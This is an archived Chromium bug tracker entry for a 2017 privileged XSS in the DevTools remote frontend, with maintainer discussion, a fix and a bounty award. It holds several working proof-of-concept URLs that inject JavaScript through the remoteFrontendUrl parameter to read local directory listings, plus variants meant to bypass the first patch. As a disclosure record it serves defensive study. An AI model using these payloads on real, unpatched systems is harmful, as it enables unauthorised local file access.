# Security: Privileged XSS in DevTools

| Field | Value |
|-------|-------|
| **Issue ID** | [40089332](https://issues.chromium.org/issues/40089332) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Platform>DevTools |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | ju...@gmail.com |
| **Assignee** | ca...@chromium.org |
| **Created** | 2017-10-17 |
| **Bounty** | $1,000.00 |

## Description

VULNERABILITY DETAILS
There is a cross-site scripting vulnerability in the DevTools remote frontend that allows privileged JavaScript execution and e.g. file system access. This is related to issues 571121, 607939, and 618333.

VERSION
Chrome Version: 61.0.3163.100 stable
Operating System: all desktop OS

REPRODUCTION CASE
Navigate to one of the following URLs in Chrome, depending on your OS:

Windows: chrome-devtools://devtools/remote/serve_rev/@199588/devtools.html?remoteFrontendUrl=javascript:w=open("devtools.html");w.onload=_=>w.eval(`DevToolsAPI.streamWrite=(e,o)=>document.write(o);DevToolsAPI.sendMessageToEmbedder("loadNetworkResource",["file:///C:/","",0]);`)

Linux/macOS: chrome-devtools://devtools/remote/serve_rev/@199588/devtools.html?remoteFrontendUrl=javascript:w=open("devtools.html");w.onload=_=>w.eval(`DevToolsAPI.streamWrite=(e,o)=>document.write(o);DevToolsAPI.sendMessageToEmbedder("loadNetworkResource",["file:///","",0]);`)

A new tab should open, displaying a directory listing of C:\ or /.

The chrome-devtools:// URL scheme is a restricted one and cannot be navigated to directly from an arbitrary web page, but the chrome.tabs APIs allow access to it from an unprivileged extension. And then there's https://crbug.com/chromium/149877, which allows access to restricted URLs via drag-and-drop.


## Timeline

### ke...@chromium.org (2017-10-17)

Thanks for the report.

dgozman@, can you please take a look at this? I can verify that it repros on Stable. It looks like sanitizeRemoteFrontendUrl() should reject this so I'm not clear on how it works.

[Monorail components: Platform>DevTools]

### ju...@gmail.com (2017-10-17)

I don't think sanitizeRemoteFrontendUrl gets ever called; the query parameter accepts any value.

The only trick here was getting access to DevToolsHost by opening a new window, since it's not defined in the original one. An iframe would have worked too.

### dg...@chromium.org (2017-10-23)

I suspect this was regressed by https://codereview.chromium.org/2620153002/.

### sh...@chromium.org (2017-11-01)

caseq: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### es...@chromium.org (2017-11-09)

Friendly ping from the security sheriff; any updates on this bug?

### es...@chromium.org (2017-11-09)

Also I'm wondering if this should be considered High severity instead of Medium. AFAIK DevTools is considered to be trusted like the browser process, so isn't an XSS in DevTools really a sandbox escape (albeit mitigated by the fact that you have to have DevTools open)?

### ca...@chromium.org (2017-11-09)

Apologies for delay, looking into it now!

### ca...@chromium.org (2017-11-15)

Fixed by this: https://chromium-review.googlesource.com/c/chromium/src/+/770511

### ju...@gmail.com (2017-11-15)

> only expose bindings in window if opener has bindings or there's no opener

This seems insufficient. Here's a modified version of the original PoC where the final window has no opener:

chrome-devtools://devtools/remote/serve_rev/@199588/devtools.html?remoteFrontendUrl=javascript:w0=open();w0.w=open();w0.eval(`w.location="devtools.html";setTimeout(_=>w.eval(\`DevToolsAPI.streamWrite=(e,o)=>document.write(o);DevToolsAPI.sendMessageToEmbedder("loadNetworkResource",["file:///","",0]);\`),1000)`);top.location="data:,"

### pa...@chromium.org (2017-11-15)

caseq: Given #9, can you please check if the fix is complete or if it needs more work? Thanks!

### ca...@chromium.org (2017-11-15)

juhonurm: can you actually get it to work with the patch, provided that you disable additional safeguards in devtools_ui.cc? I couldn't, I think once the navigation happens due to w.location="devtools.html" the window is actually swapped and you end up with failed cross-origin check at w.eval(). At least that's what I see in DevTools attached to w0, and I didn't manage to get around that by tweaking your code so far.

palmer: I think we should be safe due to the fact that we're blocking fetch for chrome-devtools://remote/... with invalid URLs, which should be sufficient even without the check for opener in devtools_ui_bindings.cc, but of course I'd like to make sure that the said check is also effective.

### ju...@gmail.com (2017-11-16)

caseq: I'll see if I can test that out later. I don't understand how you could get a cross-origin failure though, since w and w0 are both in the same origin the whole time and the code works in current stable just like original PoC. Nothing related to origins changed in the patch as far as I can tell?

You could try opening w0 explicitly in the devtools origin (as opposed to just about:blank) like this and see if it helps:

chrome-devtools://devtools/remote/serve_rev/@199588/devtools.html?remoteFrontendUrl=javascript:w0=open("devtools.html");setTimeout(_=>{w0.w=open();w0.eval(`w.location="devtools.html";setTimeout(_=>w.eval(\`DevToolsAPI.streamWrite=(e,o)=>document.write(o);DevToolsAPI.sendMessageToEmbedder("loadNetworkResource",["file:///","",0]);\`),1000)`);top.location="data:,"},1000)

I'm also not saying the patch itself is insufficient, my comment was aimed just at the opener part. Blocking the fetch should be enough on its own, but it seems to me the opener check doesn't really add anything other than unnecessary complexity.

### ca...@chromium.org (2017-11-16)

juhonurm: so none of the snippets that rely on navigating a devtools window to devtools.html and later scripting it work for me, even on a version without my patch. The reason, I think, is that we're force-swapping the site instance upon navigation -- so yes, technically you have two windows with same origin, but they're in different processes and can't script each other.

I'm not entirely happy with just a loading-time check (i.e. one in devtools_ui.cc), because given our difficult history with problem like this one, it would be nice to have a check at the time of exposing bindings, just in case additional attack vectors emerge. For example, the loading-time check is not hit when the page is loaded from app-cache.

I'm closing the bug for now, since I think we addressed this particular problem, but if you come up with more ideas on how to circumvent either check, please feel free to re-open. Oh, and thanks a lot for these nice exploits!


### sh...@chromium.org (2017-11-17)

[Empty comment from Monorail migration]

### aw...@google.com (2017-11-20)

[Empty comment from Monorail migration]

### ju...@gmail.com (2017-11-30)

HTML injection still possible; reported separately as https://crbug.com/chromium/790695.

### aw...@chromium.org (2017-12-01)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2017-12-01)

Hi juhonurm@, the VRP panel has decided to award $1000 for this bug, the amount reflecting that it's fairly heavily mitigated. Thanks for the new report, the panel will look at that in due course when it's fixed.

Also, how would you like to be credited in our release notes? 

### aw...@google.com (2017-12-01)

[Empty comment from Monorail migration]

### ju...@gmail.com (2017-12-01)

awhalley: Thanks! Please credit me as Juho Nurminen.

### aw...@chromium.org (2017-12-01)

[Empty comment from Monorail migration]

### aw...@google.com (2017-12-04)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-12-15)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-12-15)

This bug requires manual review: M64 has already been promoted to the beta branch, so this requires manual review
Please contact the milestone owner if you have questions.
Owners: cmasso@(Android), cmasso@(iOS), kbleicher@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@google.com (2017-12-18)

commit 484f731aaead5d72c26a21ea012cd2a706146f19 was initially in 64.0.3270.0, no merge needed.

### aw...@google.com (2018-01-22)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-01-24)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-02-24)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2018-03-27)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### aw...@google.com (2018-10-05)

[Empty comment from Monorail migration]

### is...@google.com (2018-10-05)

This issue was migrated from crbug.com/chromium/775527?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40089332)*
